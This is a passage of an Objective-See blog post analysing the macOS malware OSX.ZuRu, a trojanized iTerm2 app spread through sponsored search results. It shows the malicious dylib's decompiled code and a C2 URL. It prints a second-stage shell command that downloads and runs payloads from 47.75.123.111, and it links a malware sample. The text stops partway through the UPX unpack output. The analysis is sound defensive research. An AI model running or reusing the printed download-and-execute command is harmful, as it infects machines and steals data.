<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x66/search.jpg />
<meta name="twitter:title" content=Made&#32;in&#32;China:&#32;OSX.ZuRu />
<meta name="twitter:description" content=trojanized&#32;apps&#32;spread&#32;malware,&#32;via&#32;sponsored&#32;search&#32;results />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Made&#32;in&#32;China:&#32;OSX.ZuRu />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x66/search.jpg />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Made in China: OSX.ZuRu</div>
  <div class="blogSubTitle">trojanized apps spread malware, via sponsored search results</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / September 14, 2021</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;">Objective-See's research, tools, and writing, are supported by the "Friends of Objective-See" such as:</div>
    <center>
    <div class="download-link" style="padding: 10px; margin-left: 20px; ">
        <a href="https://1password.com/?utm_medium=parnter&utm_source=Objective-See&utm_campaign=gp&utm_content=sponsorship" style="border: 0px;">
            <img src="https://objective-see.com/images/friends/1Password.png" height="50px">
            <div class="logo-title" style="text-align: center;">...the world’s most-loved password manager.</div>
        </a>
    </div>
    <div class="download-link" style="padding: 10px; margin-left: 15px; ">
        <a href="http://kandji.io/" style="border: 0px;">
            <img src="https://objective-see.com/images/friends/kandji.png" height="50px">
            <div class="logo-title" style="text-align: center;">...next-generation apple enterprise management.</div>
        </a>
    </div>
    <br>
    <br>
    <div class="download-link" style="padding: 10px;">
        <a href="https://mosyle.com" style="border: 0px;">
            <img src="https://objective-see.com/images/friends/mosyle.png" height="55px">
        <div class="logo-title" style="text-align: center;">...modern apple mdm & security for enterprise &amp; education.</div>
        </a>
    </div>
    <div class="download-link" style="padding: 10px;">
        <a href="https://www.jamf.com?utm_source=objective-see&utm_medium=sponsored-link&utm_campaign=next-gen-security&utm_content=2021-02-05_protect" style="border: 0px;">
            <img src="https://objective-see.com/images/friends/jamf.png" height="55px">
        <div class="logo-title" style="text-align: center;">...the standard in apple enterprise management.</div>
        </a>
    </div>
    <br>
    <br>
    <div class="download-link" style="padding: 10px;">
        <a href="https://macpaw.com/cleanmymac" style="border: 0px;">
            <img src="https://objective-see.com/images/friends/cleanmymac.png" height="55px">
        <div class="logo-title" style="text-align: center;">...an all-in-one package to awesomize your Mac.</div>
        </a>
    </div>
    </center>
      <br>
      <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
</div>
<br>
<br>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve uploaded an <a href="https://objective-see.com/downloads/malware/ZuRu.zip">OSX.ZuRu sample</a> (password: infect3d).</p>
<div align="right" style="padding-right:10px; padding-bottom:10px;">
...please don’t infect yourself! 
</div>
</div>
<br>
<h3 id="background">Background</h3>
<p>Late on September 14th, the noted security researcher Zhi, (<a href="https://twitter.com/CodeColorist">@CodeColorist</a>), tweeted about new attack that was spreading (new?) macOS malware via sponsored search engine results:</p>
<center>

</center>
<br>
<div class="note">
ℹ️ The posting mentioned in his tweet, <a href="https://zhuanlan.zhihu.com/p/408746101" class="inlineLink">zhuanlan.zhihu.com/p/408746101</a>, provides a detailed overview of the attack. Moreover, it appears to be the first mention of this attack, and as such, should be credited with the discovery of this (widespread?) attack.
<br>
<br> 
Here, we build upon this posting, providing an analysis that focuses on uncovering the technical details of the attack, such as the specific method of trojanization.
</div>
<p>As Zhi noted, the malware was hosted on the site <code>iTerm2.net</code>.
<br>
This malicious site, appears identical to the legitimate and popular iTerm2 website (<code>iTerm2.com</code>):</p>
<img src="../images/blog/blog_0x66/website.png"  width="100%" class="center" style="border-radius: 4px;">

<p>The fact the the malicious site, masquerades as the legitimate one is unsurprising as the malware&rsquo;s attack vector is based on simple trickery. Specifically, as noted by Zhi and in aforementioned <a href="https://zhuanlan.zhihu.com/p/408746101">writeup</a>, users who searched for &lsquo;iTerm2&rsquo; on the Chinese search engine Baidu would have been presented with the sponsored link to the malware:</p>
<img src="../images/blog/blog_0x66/search.jpg"  width="" class="center" style="border-radius: 4px;">

<p>&hellip;and following this link, as the malicious site was a clone, perhaps not realize anything was amiss.</p>
<div class="note">
ℹ️ As of September 15th, the malicious site, iTerm2.net, appears offline.
</div>
<h3 id="wheres-the-malware">Where&rsquo;s the Malware?</h3>
<p>To download the malware users would have to click the <code>Download</code> button, then any of the links on the download page. This would download a disk image named <code>iTerm.dmg</code> from <code>http://www.kaidingle.com/iTerm/iTerm.dmg</code></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% shasum -a 1 ~/Downloads/iTerm.dmg
a2651c95ed756d07fd204785072c951376010bd8  /Users/patrick/Downloads/iTerm.dmg
</pre>
</div>
<p>Currently this disk image is not flagged by any of the anti-virus engines on VirusTotal as malicious:
<img src="../images/blog/blog_0x66/vtDMG.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<p>We can mount the downloaded disk image (to <code>/Volumes/iTerm</code>), to examine its contents:</p>
<img src="../images/blog/blog_0x66/dmg.png"  width="" class="center" style="border-radius: 4px;">

<p>The main item on the disk image is an application named <code>iTerm</code>. It appears to mimic again, the legitimate <code>iTerm</code> app.
Examining the code-signing certificate, we can see that this application is signed, albeit by a <code>Jun Bi (AQPZ6F3ASY)</code></p>
<img src="../images/blog/blog_0x66/signed.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Signed, by Jun Bi (AQPZ6F3ASY)</center>

<p>However it is not notarized:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% spctl -a -t exec -vvv /Volumes/iTerm/iTerm.app/

/Volumes/iTerm/iTerm.app/: rejected
origin=Apple Distribution: Jun Bi (AQPZ6F3ASY)

</pre>
</div>
<br></p>
<div class="note">
ℹ️ The legitimate iTerm2 application is signed by a GEORGE NACHMAN, and is fully notarized.
</div>
<p><em>Update:</em>
As of September 15th, Apple has revoked <code>Jun Bi</code>&rsquo;s code-signing certificate:
<br>
<br>
<img src="../images/blog/blog_0x66/revoked.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Certificate, now revoked</center>
</p>
<p>The legitimate and the malicious iTerm2 application bundles contain a massive number of files, including several Mach-O binaries. Moreover, the malicious version appears largely benign (as is the case with most applications that have been surreptitiously trojanized). As such, it takes us a minute to uncover the malicious component.</p>
<p>One of the first actions I take when triaging a new (possibly malicious) binary is dump it&rsquo;s dependencies. Often you can learn a lot about a binary based on the dynamic libraries it is linked against.</p>
<p>Using <code>otool</code>, we view the dependencies of the (suspected to be malicious) iTerm2 application, downloaded from the suspicious <code>iTerm2.net</code></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% otool -L /Volumes/iTerm/iTerm.app/Contents/MacOS/iTerm2

/usr/lib/libaprutil-1.0.dylib 
/usr/lib/libicucore.A.dylib 
/usr/lib/libc++.1.dylib 
...
/usr/lib/libz.1.dylib 
@executable_path/../Frameworks/libcrypto.2.dylib
</pre>
</div>
<p>That last library does appear a bit shady (in comparison to the others), simply based on it&rsquo;s path, and name. 🤔</p>
<p>And if we dump the dependencies of the the legit iTerm2 application, lo and behold, it does <strong>not</strong> have such a dependency:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
otool -L ~/Downloads/iTerm.app/Contents/MacOS/iTerm2

/usr/lib/libaprutil-1.0.dylib
/usr/lib/libicucore.A.dylib 
/usr/lib/libc++.1.dylib
...
/usr/lib/libz.1.dylib
</pre>
</div></p>
<p>So, have we found the malware? (spoiler: yes).</p>
<p>The <code>libcrypto.2.dylib</code> file is 64bit Mach-O dylib, with a SHA1 hash of <code>72ecd873c07b1f96b01bd461d091547f9dbcb2b7</code></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% file libcrypto.2.dylib
libcrypto.2.dylib: Mach-O 64-bit dynamically linked shared library x86_64

% shasum -a 1 libcrypto.2.dylib 
72ecd873c07b1f96b01bd461d091547f9dbcb2b7  /Volumes/iTerm/iTerm.app/Contents/Frameworks/libcrypto.2.dylib
</pre>
</div>
<p>Currently this dylib is not (also) flagged by any of the anti-virus engines on VirusTotal as malicious:
<img src="../images/blog/blog_0x66/vtDylib.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<h3 id="analysis-of-libcrypto2dylib">Analysis of libcrypto.2.dylib</h3>
<p>If the user runs the trojanized iTerm2 app, nothing appears amiss as a legitimate iTerm shell is shown.</p>
<p>Quickly triaging the trojanized iTerm2 application bundle&rsquo;s main binary, <code>iTerm2</code>, appears to be simply a copy of the legitimate iTerm app. The only modification is the addition of a <code>LC_LOAD_DYLIB</code> load command, which adds a dependency to <code>libcrypto.2.dylib</code></p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% otool -l /Volumes/iTerm/iTerm.app/Contents/MacOS/iTerm2
    Load command 50
          cmd LC_LOAD_DYLIB
      cmdsize 80
         name @executable_path/../Frameworks/libcrypto.2.dylib (offset 24)
   time stamp 0 Wed Dec 31 14:00:00 1969
      current version 0.0.0
compatibility version 0.0.0

</pre>
</div>
<p>So how does the <code>libcrypto.2.dylib</code> get executed when a user launches the trojanized iTerm2 application? Excellent question! &hellip;and the answer is, in a very subtle way!</p>
<p>At load time macOS&rsquo;s dynamic loader, <code>dyld</code> will load any/all dependencies &hellip;including the malicious <code>libcrypto.2.dylib</code>. But loading a dylib doesn&rsquo;t necessarily execute of its code &hellip;unless it explicitly contains a constructor or initialization routine. Which yes, <code>libcrypto.2.dylib</code> does! Specifically, it implements the <code>load</code> method at <code>0x0000000000002040</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>               
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">+</span>[crypto_2 load]<span style="color:#f92672">:</span>                       
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#ae81ff">0x0000000000002040</span>         push       rbp                                       
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#ae81ff">0x0000000000002041</span>         mov        rbp, rsp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#ae81ff">0x0000000000002044</span>         sub        rsp, <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#ae81ff">0x0000000000002048</span>         mov        qword [rbp<span style="color:#f92672">+</span>var_8], rdi
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#ae81ff">0x000000000000204c</span>         mov        qword [rbp<span style="color:#f92672">+</span>var_10], rsi
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#ae81ff">0x0000000000002050</span>         mov        rax, qword [objc_cls_ref_NSObject]        
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#ae81ff">0x0000000000002057</span>         mov        rsi, qword [<span style="color:#ae81ff">0x40530</span>]                      
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#ae81ff">0x000000000000205e</span>         mov        rdi, rax                                  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#ae81ff">0x0000000000002061</span>         call       qword [_objc_msgSend_38140]               
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#ae81ff">0x0000000000002067</span>         add        rsp, <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#ae81ff">0x000000000000206b</span>         pop        rbp
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#ae81ff">0x000000000000206c</span>         ret
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>                        
</span></span></code></pre></div>
<p>According to Apple&rsquo;s <a href="https://developer.apple.com/documentation/objectivec/nsobject/1418815-load?language=objc">documentation</a> on the <code>load</code> method, it is automatically invoked when for example, a dynamic library is loaded.</p>
<p>We can confirm this in a debugger:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% lldb /Volumes/iTerm/iTerm.app/         
(lldb) target create "/Volumes/iTerm/iTerm.app/"
Current executable set to '/Volumes/iTerm/iTerm.app' (x86_64).

(lldb) process launch --stop-at-entry

(lldb) b 0x101783040
Breakpoint 1: where = libcrypto.2.dylib`+[crypto_2 load], address = 0x0000000101783040

(lldb) continue

(lldb) /Volumes/iTerm/iTerm.app/Contents/MacOS/iTerm2
* thread #1, stop reason = breakpoint 1.1
libcrypto.2.dylib`+[crypto_2 load]:
->  0x101783040 <+0>: pushq  %rbp
    0x101783041 <+1>: movq   %rsp, %rbp

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x0000000101783040 libcrypto.2.dylib`+[crypto_2 load]
    frame #1: 0x00007fff665cc560 libobjc.A.dylib`load_images + 1529
    frame #2: 0x00000001011b226c dyld`dyld::notifySingle(...) + 418
    frame #3: 0x00000001011c5fe9 dyld`ImageLoader::recursiveInitialization(...) + 475
    frame #4: 0x00000001011c5f66 dyld`ImageLoader::recursiveInitialization(...) + 344
    frame #5: 0x00000001011c40b4 dyld`ImageLoader::processInitializers(...) + 188
    frame #6: 0x00000001011c4154 dyld`ImageLoader::runInitializers(....) + 82
    frame #7: 0x00000001011b26a8 dyld`dyld::initializeMainExecutable() + 199
    frame #8: 0x00000001011b7bba dyld`dyld::_main(...) + 6667
    frame #9: 0x00000001011b1227 dyld`dyldbootstrap::start(...) + 453
    frame #10: 0x00000001011b1025 dyld`_dyld_start + 37

</pre>
</div></p>
<p>In the above, note that <code>libcrypto.2.dylib</code>&rsquo;s <code>load</code> method is automatically called as part of <code>dyld</code>&rsquo;s initialization of the library.</p>
<p>If we decompile the <code>load</code> method, we find it simply calls a method called <code>hookCommon</code>. Take a look a this method:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objC" data-lang="objC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">/* @class NSObject */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>+(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">hookCommon</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#e6db74">@&#34;===========888888888 code:@%@&#34;</span>, <span style="color:#e6db74">@&#34;1111111&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    [self myOCLog:rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    rax <span style="color:#f92672">=</span> [self serialNumber];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    rax <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#e6db74">@&#34;===========888888888 identifier:@%@&#34;</span>, rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    [self myOCLog:rax];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    var_70 <span style="color:#f92672">=</span> dispatch_time(<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0x1bf08eb000</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    var_38 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>NSConcreteStackBlock;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    dispatch_after(var_70, rax, <span style="color:#f92672">&amp;</span>var_38);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>}</span></span></code></pre></div>
<p>The method first invokes the <code>myOCLog</code> method (which doesn&rsquo;t actually log anything) with the string <code>===========888888888 code:@1111111</code> and then again with the infected system&rsquo;s serial number (obtained via a call to a method aptly named <code>serialNumber</code>). Then it executes a block of logic via a <code>dispatch_after</code> &hellip;likely so the <code>load</code> method can return right away (as it should, so that other required <code>dyld</code> can continue).</p>
<p>The dispatch callback block simply calls a method named <code>request</code> (found at <code>0x0000000000003520</code>).</p>
<p>After decrypting various strings it makes a HTTP GET request via the AFNetworking library (that has been statically compiled in) to <code>https://apps.mzstatics.com/fwjNY/v.php?ver=1.3&amp;id=VMI5EOhq8gDz</code>. Note that the value for the <code>id</code> parameter is the infected systems serial number.</p>
<p>If you&rsquo;re lucky enough to have <a href="https://objective-see.com/products/lulu.html">LuLu</a> installed it will kindly alert you to this connection attempt:</p>
<img src="../images/blog/blog_0x66/lulu.png"  width="100%" class="center" style="border-radius: 4px;">

<p>Once the server has responded, the malware invokes it&rsquo;s <code>runShellWithCommand:completeBlock:</code> method. And what does it attempt to run? The following (returned from the server?), which included downloading and executing various 2nd-stage payloads from a server found at <code>47.75.123.111</code>:</p>
<pre tabindex="0"><code>curl -sfo /tmp/g.py http://47.75.123.111/g.py &amp;&amp; chmod 777 /tmp/g.py &amp;&amp; python /tmp/g.py &amp;&amp; curl -sfo /tmp/GoogleUpdate http://47.75.123.111/GoogleUpdate &amp;&amp; chmod 777 /tmp/GoogleUpdate &amp;&amp; /tmp/GoogleUpdate
</code></pre><p>We can passively observe the execution of these commands via my open-source <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">ProcessMonitor</a>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 501,
    "arguments" : [
      "/bin/sh",
      "-c",
      "curl -sfo /tmp/g.py http://47.75.123.111/g.py && chmod 777 /tmp/g.py && python /tmp/g.py && curl -sfo /tmp/GoogleUpdate http://47.75.123.111/GoogleUpdate && chmod 777 /tmp/GoogleUpdate && /tmp/GoogleUpdate"
    ]
  }
}
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 501,
    "arguments" : [
      "python",
      "/tmp/g.py"
    ]
  }
}
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "signing info (computed)" : {
      "signatureStatus" : -67062
    },
    "uid" : 501,
    "arguments" : [
      "/tmp/GoogleUpdate"
    ],
    "path" : "/private/tmp/GoogleUpdate",
    "name" : "GoogleUpdate"
  }
}

</pre>
</div>
<p>Note that in the ProcessMonitor output, we can see the malware executing the downloaded python script, <code>g.py</code> and another downloaded item, <code>GoogleUpdate</code> from a temporary directory.</p>
<br>
<div class="note">
ℹ️ The libcrypto.2.dylib binary contains embedded (compiler) strings the reveal information about the system it was created on such as: "/Users/erdou/Desktop/mac注入/sendRelease3.1/crypto.2/..."
<p>This provides both a user named (erdou), and a project name (mac注入). The latter, pronounced &ldquo;Zhùrù&rdquo; roughly translates &ldquo;mac injection&rdquo; and gives rise to the malware&rsquo;s name <b>OSX.ZuRu</b>.</p>
</div>
<h3 id="a-python-script-gpy">A Python Script: <code>g.py</code></h3>
<p>The python script, <code>g.py</code> (SHA-1: <code>20acde856a043194595ed88ef7ae0b79191394f9</code>) performs a comprehensive survey of the infected system:</p>
<img src="../images/blog/blog_0x66/python.png"  width="100%" class="center" style="border-radius: 4px;">

<p>&hellip;it then zips this up before exfiltrating it. If we allow the script run, we can then grab and extract the zip to see exactly what&rsquo;s in the survey:</p>
<img src="../images/blog/blog_0x66/survey.png"  width="100%" class="center" style="border-radius: 4px;">

<p>Looks like it includes the infected system&rsquo;s keychain, bash history, hosts, and more:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% cat tmp/tmp.txt 
获取操作系统名称及版本号 : [Darwin-19.6.0-x86_64-i386-64bit]
获取操作系统版本号 : [Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64]
获取操作系统的位数 : [('64bit', '')]
计算机类型 : [x86_64]
计算机的网络名称 : [users-mac.lan]
计算机处理器信息 : [i386]
获取操作系统类型 : [Darwin]
汇总信息 : [('Darwin', 'users-mac.lan', '19.6.0', 'Darwin Kernel Version 19.6.0: Thu Jun 18 20:49:00 PDT 2020; root:xnu-6153.141.1~1/RELEASE_X86_64', 'x86_64', 'i386')]
程序列表 : [<function get_applications_list at 0x1006e2320>]
hosts文件 : [##
# Host Database
#
# localhost is used to configure the loopback interface
# when the system is booting.  Do not change this entry.
##
127.0.0.1   localhost
255.255.255.255 broadcasthost
::1             localhost
]
当前用户名 : user
test : [[u'Desktop', u'Documents', u'Downloads', u'Library', u'Movies', u'Music', u'Pictures', u'Public']]

</pre>
</div>
<p>Once the Python script has completed surveying the infected host, it exfiltrates it via <code>curl</code> to the same IP address (<code>47.75.123.111</code>). Again, LuLu will alert you, this time about the exfiltration attempt:</p>
<img src="../images/blog/blog_0x66/lulu2.png"  width="100%" class="center" style="border-radius: 4px;">

<h3 id="a-mach-o-binary-googleupdate">A Mach-O Binary: <code>GoogleUpdate</code></h3>
<p>The second item the trojanized <code>iTerm</code> application downloads and executes is a Mach-O binary named <code>GoogleUpdate</code> (SHA-1: <code>25d288d95fe89ac82b17f5ba490df30356ad14b8</code>).</p>
<p>Currently this binary is not flagged by any of the anti-virus engines on VirusTotal as malicious:
<img src="../images/blog/blog_0x66/vtMachO.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<p>A quick look at it strings reveals its packed by UPX. We can unpack it with a recent version of UPX:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

% upx -d /Users/patrick/Downloads/GoogleUpdate 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
